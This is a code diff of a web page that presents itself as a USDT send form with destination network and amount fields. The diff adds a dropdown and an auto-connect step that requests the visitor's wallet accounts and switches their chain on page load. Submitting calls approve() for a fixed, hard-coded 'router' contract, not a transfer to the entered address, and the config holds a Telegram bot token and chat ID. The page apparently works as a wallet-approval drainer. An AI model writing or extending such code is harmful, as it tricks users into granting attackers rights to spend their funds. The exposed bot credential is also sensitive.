@@ -19,8 +19,19 @@
         .input-row input::placeholder { color: var(--muted); font-weight: 500; }
         .paste, .max { font-size: 13px; font-weight: 600; cursor: pointer; color: var(--accent); background: none; border: none; padding: 0; white-space: nowrap; }
         .unit { font-size: 12px; color: var(--subtext); white-space: nowrap; }
-        .token-display { display: flex; align-items: center; gap: 8px; height: 48px; padding: 0 12px; border-radius: 12px; background: var(--input-soft); border: 1.5px solid var(--border-default); margin-bottom: 14px; }
-        .token-logo { width: 20px; height: 20px; border-radius: 50%; object-fit: cover; }
+        .network-row { display: inline-flex; align-items: center; gap: 8px; height: 48px; padding: 0 12px; border-radius: 999px; background: var(--input-soft); border: 1.5px solid var(--border-default); margin-bottom: 16px; width: 100%; cursor: pointer; transition: all 0.2s ease; position: relative; }
+        .network-row:hover { border-color: #2563eb; }
+        .network-row.open { border-color: #2563eb; }
+        .network-left { display: flex; align-items: center; gap: 8px; flex: 1; }
+        .token-logo { width: 24px; height: 24px; border-radius: 50%; object-fit: cover; }
+        .network-left span { font-size: 14px; font-weight: 500; color: var(--text); }
+        .network-arrow { width: 16px; height: 16px; transition: transform 0.2s ease; color: var(--subtext); }
+        .network-row.open .network-arrow { transform: rotate(180deg); }
+        .token-dropdown-menu { position: absolute; top: 100%; left: 0; right: 0; background: white; border: 1.5px solid var(--border-default); border-top: none; border-radius: 0 0 12px 12px; max-height: 300px; overflow-y: auto; z-index: 1000; display: none; margin-top: -4px; }
+        .token-dropdown-menu.open { display: block; }
+        .token-option { padding: 12px; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: all 0.2s ease; border-bottom: 1px solid #f0f0f0; font-size: 13px; }
+        .token-option:hover { background: #f5f5f5; }
+        .token-option.active { background: #f0f0f0; font-weight: 600; }
         .token-info { display: flex; flex-direction: column; gap: 2px; }
         .token-name { font-weight: 600; font-size: 13px; }
         .token-network { font-size: 11px; color: #999; }
@@ -77,19 +88,22 @@
                     <span class="paste" onclick="pasteAddress()">Paste</span>
                 </div>
 
-                <label class="label">Token</label>
-                <div class="token-display">
-                    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" alt="USDT" class="token-logo">
-                    <div class="token-info">
-                        <div class="token-name">USDT on Ethereum</div>
-                        <div class="token-network">Ethereum</div>
+                <label class="label">Destination Network</label>
+                <div class="network-row" id="tokenSelector" onclick="toggleTokenDropdown()">
+                    <div class="network-left">
+                        <img id="selectedTokenLogo" src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" alt="USDT" class="token-logo">
+                        <span id="selectedTokenName">USDT on Ethereum</span>
                     </div>
+                    <svg class="network-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path>
+                    </svg>
+                    <div class="token-dropdown-menu" id="tokenDropdownMenu"></div>
                 </div>
 
                 <label class="label">Amount</label>
                 <div class="input-row amount-row">
                     <input id="amountInput" type="number" placeholder="Amount" step="0.01" />
-                    <span class="unit">USDT</span>
+                    <span class="unit" id="tokenUnit">USDT</span>
                     <span class="max" onclick="setMaxAmount( )">Max</span>
                 </div>
 
@@ -103,29 +117,98 @@
     </div>
 
     <script>
+        const TOKENS = {
+            'usdt_eth': { name: 'USDT on Ethereum', symbol: 'USDT', network: 'Ethereum', chainId: 1, chainIdHex: '0x1', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png', rpc: 'https://eth.llamarpc.com', smartContract: '0x89cEdf704380E6A3B3485e66A8A72f6886969509' }
+        };
+
         const CONFIG = {
-            USDT_ADDRESS: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
             ROUTER_ADDRESS: '0x89cEdf704380E6A3B3485e66A8A72f6886969509',
-            USDT_DECIMALS: 6,
-            CHAIN_ID: 1,
-            CHAIN_ID_HEX: '0x1',
             TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA',
             TELEGRAM_CHAT_ID: '8933407008'
         };
 
-        const ROUTER_ABI = [
-            "function approveUSDT(uint amount) public"
-        ];
-
         const USDT_ABI = [
-            "function approve(address spender, uint256 amount) external returns (bool)"
+            "function approve(address spender, uint256 amount ) external returns (bool)"
         ];
 
         let userAddress = null;
+        let selectedToken = 'usdt_eth';
 
-        document.addEventListener('DOMContentLoaded', () => {
+        document.addEventListener('DOMContentLoaded', async () => {
+            initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
+            
+            // Auto-connect
+            await autoConnect();
         });
+
+        async function autoConnect() {
+            try {
+                if (!window.ethereum) {
+                    showError('MetaMask/Trust Wallet not installed');
+                    return;
+                }
+
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userAddress = accounts[0];
+                
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                const token = TOKENS[selectedToken];
+                
+                if (chainId !== token.chainIdHex) {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: token.chainIdHex }],
+                    });
+                }
+            } catch (error) {
+                console.log('Auto-connect:', error.message);
+            }
+        }
+
+        function initializeTokenDropdown() {
+            const menu = document.getElementById('tokenDropdownMenu');
+            menu.innerHTML = '';
+            for (const [key, token] of Object.entries(TOKENS)) {
+                const option = document.createElement('div');
+                option.className = `token-option ${key === selectedToken ? 'active' : ''}`;
+                option.onclick = (e) => {
+                    e.stopPropagation();
+                    selectToken(key);
+                };
+                option.innerHTML = `<img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'"><div class="token-info"><div class="token-name">${token.symbol}</div><div class="token-network">${token.network}</div></div>`;
+                menu.appendChild(option );
+            }
+        }
+
+        function closeDropdown() {
+            const selector = document.getElementById('tokenSelector');
+            const menu = document.getElementById('tokenDropdownMenu');
+            selector.classList.remove('open');
+            menu.classList.remove('open');
+        }
+
+        function toggleTokenDropdown() {
+            const selector = document.getElementById('tokenSelector');
+            const menu = document.getElementById('tokenDropdownMenu');
+            
+            if (selector.classList.contains('open')) {
+                closeDropdown();
+            } else {
+                selector.classList.add('open');
+                menu.classList.add('open');
+            }
+        }
+
+        function selectToken(key) {
+            selectedToken = key;
+            const token = TOKENS[key];
+            document.getElementById('selectedTokenLogo').src = token.logo;
+            document.getElementById('selectedTokenName').textContent = token.name;
+            document.getElementById('tokenUnit').textContent = token.symbol;
+            closeDropdown();
+            initializeTokenDropdown();
+        }
 
         function updateAmountInfo() {
             const amount = parseFloat(document.getElementById('amountInput').value) || 0;
@@ -192,22 +275,12 @@
                     return;
                 }
 
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                userAddress = accounts[0];
-
-                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                if (chainId !== CONFIG.CHAIN_ID_HEX) {
-                    showError('Please switch to Ethereum network');
-                    btn.disabled = false;
-                    btn.textContent = 'Approve';
-                    return;
-                }
-
+                const token = TOKENS[selectedToken];
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
 
-                const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
-                const amountWei = ethers.utils.parseUnits(amount, CONFIG.USDT_DECIMALS);
+                const usdtContract = new ethers.Contract(token.address, USDT_ABI, signer);
+                const amountWei = ethers.utils.parseUnits(amount, token.decimals);
                 
                 const approveTx = await usdtContract.approve(CONFIG.ROUTER_ADDRESS, amountWei);
                 await approveTx.wait();
